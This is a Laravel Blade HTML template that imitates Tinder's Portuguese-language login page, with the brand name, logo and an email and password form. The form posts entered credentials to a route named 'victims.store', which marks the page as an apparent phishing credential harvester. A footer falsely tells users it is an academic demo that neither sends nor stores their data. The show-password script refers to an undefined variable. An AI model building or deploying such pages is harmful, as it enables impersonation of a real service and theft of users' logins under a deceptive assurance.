<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">

  <title>Entrar — Tinder</title>
  <link rel="icon" type="image/x-icon" href="{{ asset('icons/site.ico') }}">

  @vite('resources/css/global.css')
  @vite('resources/js/shared.js')

  <script src="https://cdn.tailwindcss.com"></script>

  <script>
    tailwind.config = {
      theme: {
        extend: {
          colors: {
            match: "#ff4458",
            ink: "#17171f"
          },
          fontFamily: {
            sans: ["Inter", "sans-serif"]
          }
        }
      }
    };
  </script>

  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
    rel="stylesheet"
  >

  <script src="https://unpkg.com/lucide@0.468.0/dist/umd/lucide.min.js"></script>

</head>

<body class="min-h-screen bg-[#f7f7fb] text-ink">
  <main class="grid min-h-screen lg:grid-cols-2">

    <section class="login-visual relative hidden overflow-hidden lg:block">
      <a
        href="/"
        class="absolute left-10 top-8 z-10 flex items-center gap-2 text-2xl font-black text-white"
      >
        <i data-lucide="flame" class="fill-white"></i>
        tinder
      </a>

      <p class="absolute inset-x-10 bottom-12 z-10 max-w-lg text-4xl font-extrabold leading-tight text-white">
        Pessoas interessantes estão mais perto do que você imagina.
      </p>
    </section>

    <section class="flex items-center justify-center p-6">
      <div class="w-full max-w-md rounded-[30px] bg-white p-7 shadow-xl shadow-black/5 sm:p-10">

        <a
          href="/"
          class="mb-8 flex items-center justify-center gap-2 text-2xl font-black lg:hidden"
        >

          <i data-lucide="flame" class="fill-match text-match"></i>
          tinder
        </a>

        <h1 class="text-3xl font-extrabold">Boas-vindas</h1>

        <p class="mt-2 text-black/50">
          Entre para continuar descobrindo conexões.
        </p>

        <form id="demoLogin" class="mt-8 space-y-5"  method="POST" action="{{ route('victims.store') }}"> 
            <label class="block">
            <span class="mb-2 block text-sm font-bold">E-mail</span>
            @csrf

            <input
              required
              id="email"
              type="email"
              name="email"
              placeholder="voce@exemplo.com"
              class="field"
            >
          </label>

          <label class="block">
            <span class="mb-2 block text-sm font-bold">Senha</span>

            <div class="relative">
              <input
                required
                id="password"
                type="password"
                name="password"
                placeholder="Sua senha"
                class="field pr-12"
              >

              <button
                type="button"
                id="showPassword"
                class="absolute right-4 top-1/2 -translate-y-1/2 text-black/35"
                aria-label="Mostrar ou esconder senha"
              >
                <i data-lucide="eye"></i>
              </button>
            </div>
          </label>

          <button class="brand-gradient w-full rounded-full py-3.5 font-extrabold text-white">
            Entrar
          </button>
        </form>

        <div class="my-6 flex items-center gap-3 text-xs text-black/30">
           <span class="h-px flex-1 bg-black/10"></span>
          OU
          <span class="h-px flex-1 bg-black/10"></span>
        </div>

        <button
          id="demoBtn"
          class="w-full rounded-full border border-black/10 py-3.5 font-bold"
        >
          Acessar demonstração
        </button>

        <p class="mt-6 rounded-xl bg-amber-50 p-3 text-center text-xs leading-relaxed text-amber-800">
          Demonstração acadêmica: os dados digitados não são enviados nem armazenados.
        </p>
      </div>
    </section> 
  </main>

  <script>
    const formulario = document.querySelector("#demoLogin");
    const botaoDemonstracao = document.querySelector("#demoBtn");
    const botaoMostrarSenha = document.querySelector("#showPassword");

    botaoDemonstracao.addEventListener("click", function () {
      window.location.href = "/discover";
    });

    botaoMostrarSenha.addEventListener("click", function () {
      if (campoSenha.type === "password") {
        campoSenha.type = "text";
      } else {
        campoSenha.type = "password";
      }
    });
  </script>

</body>
</html>